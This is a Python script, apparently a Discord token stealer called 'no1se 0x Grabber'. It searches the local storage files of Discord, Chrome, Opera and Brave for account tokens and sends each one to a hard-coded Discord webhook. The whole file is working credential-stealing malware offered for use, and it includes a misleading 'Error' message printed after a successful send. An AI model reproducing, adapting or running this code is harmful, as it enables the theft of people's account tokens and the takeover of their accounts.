import os
import re
import requests
import json

def send_webhook(url, token):
    data = {
        "username": "no1se 0x Grabber",
        "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQRecNTBUQO7mj6tvPjPJZFt6W8IMCsCHNcbRkS_0P7cHiwjvjGJLIm8sdNpg4eEYzfbFM&usqp=CAU",
        "embeds": [{
            "title": "Please support me by opening the Linversite link: https://link-hub.net/546300/support-me",
            "description": f"`{token}`",
            "color": 0xFF0000,
            "footer": {
                "text": "Made By no1se"
            },
            "thumbnail": {
                "url": "https://media-cldnry.s-nbcnews.com/image/upload/newscms/2022_44/3578892/221101-obama-wisconsin-rally-an.jpg"
            }
        }]
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(url, data=json.dumps(data), headers=headers)
    if response.status_code == 204:
        print(f"Error 9QTC4RYY")

def get_tokens():
    token_list = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        for foldername in os.listdir(path + '\\Local Storage\\leveldb'):
            if not foldername.endswith('.log') and not foldername.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(path + '\\Local Storage\\leveldb\\' + foldername, errors='ignore').readlines() if x.strip()]:
                for regex in [r'mfa\.[\w-]{84}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}']:
                    for token in re.findall(regex, line):
                        token_list.append(token)
                        send_webhook(WEBHOOK_URL, token)

    return token_list

if __name__ == '__main__':
    WEBHOOK_URL = "https://discord.com/api/webhooks/1081691454969221170/mphoAFeO_6CUrBLbT22ZlittpUXzR3ujBFYYiVNf4lkcjitEHWYpPEe1MbZqEBWuKwYB"
    tokens = get_tokens()
    print(f"Found {len(tokens)} token(s)!")
